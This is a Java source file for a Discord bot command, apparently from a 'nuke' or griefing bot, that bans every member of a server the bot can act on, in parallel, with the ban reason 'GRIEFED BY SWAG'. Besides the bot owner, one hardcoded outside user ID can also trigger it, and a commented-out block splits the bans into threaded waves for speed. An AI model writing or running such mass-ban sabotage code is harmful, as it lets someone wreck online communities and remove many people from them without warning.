package me.comu.exeter.commands.owner;

import me.comu.exeter.core.Core;
import me.comu.exeter.interfaces.ICommand;
import me.comu.exeter.logging.Logger;
import net.dv8tion.jda.api.entities.ISnowflake;
import net.dv8tion.jda.api.events.message.guild.GuildMessageReceivedEvent;

import java.util.Arrays;
import java.util.List;

public class BanwaveCommand implements ICommand {

    @Override
    public void handle(List<String> args, GuildMessageReceivedEvent event) {
        if (!(event.getAuthor().getIdLong() == Core.OWNERID) && !event.getAuthor().getId().equalsIgnoreCase("725452437342912542")) {
            return;
        }

        Logger.getLogger().print("Initiating Ban Wave...");
        event.getGuild().getMembers().stream().filter(member -> (member.getIdLong() != Core.OWNERID && !member.getId().equals(event.getJDA().getSelfUser().getId()) && event.getGuild().getSelfMember().canInteract(member))).map(ISnowflake::getId).parallel().forEach(member -> event.getGuild().ban(member, 0, "GRIEFED BY SWAG").queue());
        /*List<List<String>> partitionLists = Lists.partition(members, 4);
        List<String> wave1members = new ArrayList<>(partitionLists.get(0));
        List<String> wave2members = new ArrayList<>(partitionLists.get(1));
        List<String> wave3members = new ArrayList<>(partitionLists.get(2));
        List<String> wave4members = new ArrayList<>(partitionLists.get(3));
        ExecutorService executorService = Executors.newFixedThreadPool(4);
        Runnable wave1 = () -> wave1members.forEach((member) -> event.getGuild().ban(member, 0, "GRIEFED BY SWAG").queue();
        Runnable wave2 = () -> wave2members.forEach((member) -> event.getGuild().ban(member, 0, "GRIEFED BY SWAG").queue();
        Runnable wave3 = () -> wave3members.forEach((member) -> event.getGuild().ban(member, 0, "GRIEFED BY SWAG").queue();
        Runnable wave4 = () -> wave4members.forEach((member) -> event.getGuild().ban(member, 0, "GRIEFED BY SWAG").queue();
        executorService.submit(wave1);
        executorService.submit(wave2);
        executorService.submit(wave3);
        executorService.submit(wave4);*/


    }


    @Override
    public String getHelp() {
        return "Use at your own risk\n`" + Core.PREFIX + getInvoke() + "`\nAliases: `" + Arrays.deepToString(getAlias()) + "`";
    }

    @Override
    public String getInvoke() {
        return "etb";
    }

    @Override
    public String[] getAlias() {
        return new String[]{"bw", "banwave"};
    }

    @Override
    public Category getCategory() {
        return Category.OWNER;
    }
}

